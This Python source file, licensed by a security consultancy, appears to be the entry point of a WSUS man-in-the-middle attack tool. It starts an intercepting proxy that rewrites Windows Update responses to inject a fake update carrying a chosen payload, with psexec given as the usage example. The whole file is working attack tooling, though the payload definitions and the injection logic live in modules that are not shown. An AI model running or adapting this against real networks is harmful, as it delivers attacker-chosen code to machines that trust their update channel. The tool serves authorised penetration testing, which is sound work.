# The MIT License (MIT)
# 
# Copyright (c) 2015 Context Information Security Ltd.
# 
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
# 
# The above copyright notice and this permission notice shall be included in
# all copies or substantial portions of the Software.
# 
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
# THE SOFTWARE.

import sys
try:
    import configparser
except ImportError:
    import ConfigParser as configparser

from twisted.internet import reactor
from twisted.python.log import startLogging

from intercepting_proxy import InterceptingProxyFactory
from update_modifier import WsusXmlModifier, FakeWsusUpdate

PROXY_PORT = 8080

config = configparser.RawConfigParser()
config.read('payloads/payloads.ini')

if len(sys.argv) < 2:
    print('Usage: %s payload_name [port]' % sys.argv[0])
    print('e.g. %s psexec' % sys.argv[0])
    sys.exit(-1)

port = PROXY_PORT
if len(sys.argv) > 2:
    port = int(sys.argv[2])
    
payload_name = sys.argv[1]
params = dict(config.items(payload_name))
psexec_update = FakeWsusUpdate(**params) 
                            
wsus_injector = WsusXmlModifier(psexec_update)
proxy =  InterceptingProxyFactory(wsus_injector)

startLogging(sys.stdout)
reactor.listenTCP(port, proxy)
reactor.run()
